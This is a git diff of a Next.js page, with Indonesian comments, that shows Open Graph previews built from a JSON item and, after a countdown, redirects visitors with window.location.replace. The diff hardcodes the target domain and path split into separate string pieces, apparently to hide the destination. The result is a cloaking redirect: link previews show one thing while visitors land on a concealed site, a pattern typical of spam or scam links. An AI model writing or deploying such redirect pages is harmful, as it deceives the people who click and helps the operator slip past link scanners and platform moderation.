@@ -6,14 +6,14 @@ import Head from "next/head";
 interface DataItem {
   id: string;
   title: string;
-  img: string;
-  linkoffer: string;
+  image: string;
+  key: string;
 }
 
 export const getServerSideProps: GetServerSideProps<{ item: DataItem }> = async (context) => {
   const { id } = context.params!;
 
-  // Ambil data dari JSON
+  // Ambil file JSON dari /public/data.json
   const filePath = path.join(process.cwd(), "public", "data.json");
   const jsonData = fs.readFileSync(filePath, "utf-8");
   const data: DataItem[] = JSON.parse(jsonData);
@@ -21,7 +21,7 @@ export const getServerSideProps: GetServerSideProps<{ item: DataItem }> = async 
   // Cari data berdasarkan ID
   const item = data.find((x) => x.id === id);
 
-  // Kalau tidak ditemukan → redirect ke 404
+  // Jika tidak ditemukan → tampilkan 404
   if (!item) {
     return { notFound: true };
   }
@@ -30,21 +30,20 @@ export const getServerSideProps: GetServerSideProps<{ item: DataItem }> = async 
 };
 
 export default function RedirectPage({ item }: { item: DataItem }) {
-  // Pisahkan linkoffer jadi bagian-bagian agar seperti contoh kamu
-  const url = new URL(item.linkoffer);
-  const domain = url.hostname.replace("www.", "");
-  const pathPart = url.pathname;
-  const key = url.searchParams.get("key") || "";
+  const url1 = "signingunwilling";
+  const url2 = ".com";
+  const url3 = "/haba8g98r5";
 
   return (
     <>
       <Head>
         <title>{item.title}</title>
-        <meta property="og:title" content={item.title} />
-        <meta property="og:image" content={item.img} />
+        <meta name="description" content="" />
+        <meta property="og:locale" content="en_gb" />
         <meta property="og:type" content="website" />
-        <meta property="og:url" content={`https://${domain}${pathPart}?key=${key}`} />
-        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta property="og:url" content={`https://${url1}${url2}${url3}?key=${item.key}`} />
+        <meta property="og:title" content={item.title} />
+        <meta property="og:image" content={item.image} />
       </Head>
 
       <div style={styles.container}>
@@ -56,7 +55,7 @@ export default function RedirectPage({ item }: { item: DataItem }) {
         </div>
 
         <footer>
-          <input type="hidden" id="loc" value={key} />
+          <input type="hidden" id="loc" value={item.key} />
         </footer>
 
         <script
@@ -64,15 +63,15 @@ export default function RedirectPage({ item }: { item: DataItem }) {
             __html: `
               setInterval(function(){ 
                 var number = document.getElementById("number").innerHTML;
-                var url1 = '${domain.split(".")[0]}';
-                var url2 = '.${domain.split(".").slice(1).join(".")}';
-                var url3 = '${pathPart}';
+                var url1 = '${url1}';
+                var url2 = '${url2}';
+                var url3 = '${url3}';
                 if (number > 0) {
                   number--;
                 }
                 document.getElementById("number").innerHTML = number; 
                 if (number == 0) {
-                  window.location.replace('https://' + url1 + url2 + url3 + '?key=${key}');
+                  window.location.replace('https://' + url1 + url2 + url3 + "?key=${item.key}");
                 }
               }, 1000);
             `,
@@ -91,7 +90,5 @@ const styles = {
     justifyContent: "center",
     minHeight: "100vh",
     fontFamily: "'Poppins', sans-serif",
-    background: "#fff",
-    color: "#000",
   },
 };
